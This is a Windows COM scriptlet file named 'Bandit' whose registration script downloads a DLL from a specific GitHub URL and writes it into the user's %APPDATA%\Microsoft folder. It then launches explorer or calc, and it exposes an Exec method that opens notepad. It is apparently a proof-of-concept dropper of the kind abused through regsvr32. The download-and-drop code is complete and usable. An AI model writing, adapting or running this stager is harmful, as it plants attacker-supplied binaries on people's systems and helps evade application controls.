<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
	>

	<script language="JScript">
		<![CDATA[

			// Build path to %APPDATA%\Microsoft\test.txt
			var shell = new ActiveXObject("WScript.Shell");
			var env = shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\7346832764233279.dll");

			var url = "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll";

			try {
				var xhr = new ActiveXObject("MSXML2.XMLHTTP");
				xhr.open("GET", url, false);
				xhr.send();

				if (xhr.status == 200) {
					var stream = new ActiveXObject("ADODB.Stream");
					stream.Type = 1; // adTypeBinary
					stream.Open();
					stream.Write(xhr.responseBody);
					stream.SaveToFile(env, 2); // adSaveCreateOverWrite
					stream.Close();
				}
			} catch(e) {
				var r = new ActiveXObject("WScript.Shell").Run('calc.exe');
			}

    		   var r = new ActiveXObject("WScript.Shell").Run('explorer.exe "C:\"');

		]]>
	</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[

	function Exec()
	{
		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
	}

]]>
</script>

</scriptlet>
